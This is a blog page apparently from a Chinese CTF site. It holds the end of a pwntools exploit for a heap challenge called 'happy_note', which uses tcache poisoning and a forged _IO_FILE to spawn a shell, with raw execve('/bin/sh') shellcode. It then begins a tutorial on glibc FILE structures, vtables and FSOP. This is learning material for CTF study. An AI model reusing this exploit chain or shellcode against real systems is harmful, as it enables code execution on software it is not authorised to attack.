class="string">&#x27;./happy_note&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xeacec execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xeacef execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xeacf2 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, idx, mode</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Note size:&#x27;</span>, <span class="built_in">str</span>(size))    <span class="comment"># size &lt;= 0x200</span></span><br><span class="line">    sla(<span class="string">&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx)) <span class="comment"># idx &lt;= 11</span></span><br><span class="line">    <span class="comment"># mode == 1 : calloc(1, size)</span></span><br><span class="line">    <span class="comment"># mode == 2 : malloc(size)      # only twice</span></span><br><span class="line">    sla(<span class="string">&#x27;Choose a mode: [1] or [2]&#x27;</span>, <span class="built_in">str</span>(mode))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Which one do you want to show?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;Edit your content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic</span>(<span class="params">idx</span>):     <span class="comment"># only once</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x1f8</span>, i, <span class="number">1</span>)    <span class="comment"># 0 - 7</span></span><br><span class="line">add(<span class="number">0x1f8</span>, <span class="number">8</span>, <span class="number">1</span>)        <span class="comment"># 8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">magic(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x219cc0</span></span><br><span class="line">io_wfile_jumps = libc_base + <span class="number">0x2160c0</span></span><br><span class="line">io_list_all = libc_base + <span class="number">0x21a660</span></span><br><span class="line">ogg = libc_base + <span class="number">0xeacef</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;ogg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0</span>, <span class="number">1</span>)         <span class="comment"># 0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">ru(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">key = u64(r(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = (key &lt;&lt; <span class="number">12</span>) - <span class="number">0x1000</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1d8</span>, <span class="number">0</span>, <span class="number">1</span>)        <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x1d8</span>, <span class="number">1</span>, <span class="number">1</span>)        <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">pld = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x1e1</span>) + p64(io_list_all ^ key)</span><br><span class="line">edit(<span class="number">7</span>, pld)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1d8</span>, <span class="number">0</span>, <span class="number">2</span>)        <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x1d8</span>, <span class="number">1</span>, <span class="number">2</span>)        <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x1f8</span>, <span class="number">2</span>, <span class="number">1</span>)        <span class="comment"># 2</span></span><br><span class="line">edit(<span class="number">1</span>, p64(heap_base + <span class="number">0x1670</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># fp -&gt; _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x10</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># fp -&gt; _IO_write_base</span></span><br><span class="line">fake_file1 += p64(<span class="number">1</span>)    <span class="comment"># fp -&gt; _IO_write_ptr</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># fp -&gt; _IO_write_end</span></span><br><span class="line">fake_file1 += p64(<span class="number">1</span>)    <span class="comment"># _wide_data -&gt; _IO_read_end</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _wide_data -&gt; _IO_read_base</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _wide_data -&gt; _IO_write_base</span></span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x1670</span> + <span class="number">0xe0</span> + <span class="number">0x30</span> + <span class="number">0x20</span>)   <span class="comment"># _IO_write_ptr also new_rdx</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x1670</span> + <span class="number">0x30</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># fp -&gt; _mode = 0</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(io_wfile_jumps + <span class="number">0x30</span>)      <span class="comment"># fp -&gt; vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xe0</span> + <span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x1670</span> + <span class="number">0xe0</span> + <span class="number">0x30</span>)  <span class="comment"># new_rax</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file1 += p64(ogg)</span><br><span class="line"><span class="comment"># fake_file1 += b&#x27;\x00&#x27; * 0xa0</span></span><br><span class="line"><span class="comment"># fake_file1 += p64(heap_base + 0x1c90)    # rsp -&gt; orw_addr</span></span><br><span class="line"><span class="comment"># fake_file1 += p64(p_rdi_r + 1)      # rip -&gt; ret</span></span><br><span class="line">edit(<span class="number">2</span>, fake_file1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>巅峰极客</tag>
      </tags>
  </entry>
  <entry>
    <title>IO 总结</title>
    <url>/2022/08/14/Pwn/IO/</url>
    <content><![CDATA[<h2 id="IO基础"><a href="#IO基础" class="headerlink" title="IO基础"></a>IO基础</h2><p>FILE在Linux系统的标准IO库中是用于描述文件的结构，称为文件流，常被一系列流操作（<code>fopen()</code>、<code>fread()</code>、<code>fclose()</code>等）使用，其动态指针由<code>fopen()</code>函数创建，存储在堆上（<code>stdin</code>、<code>stdout</code>、<code>stderr</code>这三个位于<code>libc</code>数据段）。在<code>libc2.23</code>版本中，这个结构体是<code>_IO_FILE_plus</code>，包含了一个<code>_IO_FILE</code>结构体和一个指向<code>_IO_jump_t</code>结构体的指针<code>vtable</code>，一些函数在调用的时候会取出<code>vtable</code>所指向的函数，<code>vtable</code>也称为虚表。</p>
<span id="more"></span>

<p>FILE结构体如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>_IO_jump_t</code>结构体如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简化一下（来自Wiki）</span></span><br><span class="line"><span class="type">void</span> * funcs[] = &#123;</span><br><span class="line">   <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// &quot;extra word&quot;</span></span><br><span class="line">   <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">   <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">   <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">   <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">   <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">   <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">   <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">   <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">   <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">   <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">   <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">   <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">   <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">   <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">   <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">   <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">   <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">   <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">   <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这边引用了e4l4师傅的字段长度表，方便查询和构造：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE_plus_size = &#123;</span><br><span class="line">	<span class="string">&#x27;i386&#x27;</span>:<span class="number">0x98</span>,</span><br><span class="line">	<span class="string">&#x27;amd64&#x27;</span>:<span class="number">0xe0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_IO_FILE_plus = &#123;</span><br><span class="line">    <span class="string">&#x27;i386&#x27;</span>:&#123;</span><br><span class="line">        <span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line">        <span class="number">0x4</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line">        <span class="number">0x8</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line">        <span class="number">0xc</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x10</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x14</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line">        <span class="number">0x18</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x1c</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x20</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x24</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x28</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x2c</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x30</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line">        <span class="number">0x34</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line">        <span class="number">0x38</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line">        <span class="number">0x3c</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line">        <span class="number">0x40</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x44</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line">        <span class="number">0x46</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x47</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line">        <span class="number">0x48</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line">        <span class="number">0x4c</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x54</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line">        <span class="number">0x58</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line">        <span class="number">0x5c</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line">        <span class="number">0x60</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line">        <span class="number">0x64</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line">        <span class="number">0x68</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line">        <span class="number">0x6c</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line">        <span class="number">0x94</span>:<span class="string">&#x27;vtable&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;amd64&#x27;</span>:&#123;</span><br><span class="line">        <span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line">        <span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line">        <span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line">        <span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line">        <span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line">        <span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line">        <span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line">        <span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line">        <span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line">        <span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line">        <span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line">        <span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line">        <span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line">        <span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line">        <span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line">        <span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line">        <span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line">        <span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line">        <span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line">        <span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line">        <span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP是一种劫持<code>_IO_list_all</code>（<code>libc.so</code>中的全局变量）来伪造链表的利用技术，通过调用<code>_IO_flush_all_lockp()</code>函数触发，这个函数会刷新<code>_IO_list_all</code>链表中所有项的文件流，相当于对每个<code>FILE</code>调用<code>fflush</code>来清空缓冲区，也对应着会调用<code>_IO_FILE_plus.vtable</code>中的<code>_IO_overflow</code>函数。该方法在<code>libc-2.28</code>之后失效。</p>
<p><code>_IO_flush_all_lockp()</code>函数在以下几种情况会被调用：</p>
<ul>
<li><p><code>libc</code>检测到内存错误从而执行<code>abort</code>流程，函数调用流程如下：</p>
<p><code>malloc_printerr</code>-&gt;<code>__libc_message</code>-&gt;<code>__GI_abort_</code>-&gt;<code>_IO_flush_all_lockp</code>-&gt;<code>_IO_OVERFLOW</code></p>
</li>
<li><p>执行<code>exit</code>函数</p>
</li>
<li><p><code>main</code>函数返回时</p>
</li>
</ul>
